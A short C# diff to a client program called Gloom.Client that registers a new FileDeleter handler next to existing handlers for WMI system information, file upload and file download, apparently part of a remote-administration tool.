@@ -24,6 +24,7 @@ namespace Gloom.Client
 				client.RegisterHandler(new WmiInfoCollector(client));
 				client.RegisterHandler(new FileUploader(client));
 				client.RegisterHandler(new FileDownloader(client));
+				client.RegisterHandler(new FileDeleter(client));
 				await client.Run();
 			});
 		}
